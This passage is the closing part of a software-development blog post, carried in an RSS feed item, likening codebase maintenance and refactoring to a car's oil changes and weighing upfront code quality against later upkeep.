&lt;p&gt;What does that mean? Take an old banger of a codebase, and you’ll find yourself having to change the oil regularly. Changing the oil is a messy process that really involves rolling your sleeves up and diving in. It can take time to do, and by the time you’ve managed to do a big refactor, you’re sure everything will be running much smoother as a result, but you find you’re worn out and covered in bits of greasy old oil.&lt;/p&gt;

&lt;p&gt;What about a modern codebase? The oil here is much thinner: development practices have got a lot better and technology has really come a long way. As a result, we don’t have to spend nearly as much time under the bonnet. This is still an important part of our work, though. Much as a car needs a regular oil change, codebases need a regular touch up to keep them running. Don’t keep on top of this maintenance, and you never know when it’ll catch up to you with a bang.&lt;/p&gt;

&lt;p&gt;Finally, imagine our immaculate codebase from earlier, where quality and lack of bugs trumps all. This is the Formula 1 car of the software world. There’s no need for oil, so there’s no need for oil changes. If all the code here is perfect the first time around, why would we ever need to refactor?&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#closing-thoughts" class="anchor"&gt;
  &lt;/a&gt;
  Closing thoughts 💭
&lt;/h2&gt;

&lt;p&gt;If we think of the two practises of managing tolerances or quality, and refactoring code as linked, then we draw some nice conclusions.&lt;/p&gt;

&lt;p&gt;Focussing on tolerances and quality the first time around can lead to a huge increase in upfront cost, both in terms of time and effort. This can net you some neat benefits though. Not only can you guarantee the codebase as bug-free and brilliant, but you end up with code that needs no further work. There’s little to no maintenance cost, and you’ll never find yourself refactoring.&lt;/p&gt;

&lt;p&gt;Conversely, a focus on the low-cost, fast-paced development necessitates a lower tolerance for quality. This can be useful for getting a project into the world, but comes with a cost later down the line: you need regular oil changes and refactoring to keep everything neat, or you risk blowing up with a bang.&lt;/p&gt;

&lt;p&gt;In reality, most codebases lie between these two extremes. Rather than focussing solely on one extreme or the other, we need to be mindful of a balance. Insisting on quality over all else is a tradeoff, and at times isn’t the right one to make. Equally, we need to be careful of the costs down the line in cutting upfront quality. Next time you review a pull-request or submit a new feature, think of this tradeoff: do we mind oiling this a bit later, or do we want an immaculate Formula 1 piston right now?&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>beginners</category>
      <category>development</category>
    </item>
  </channel>
</rss>
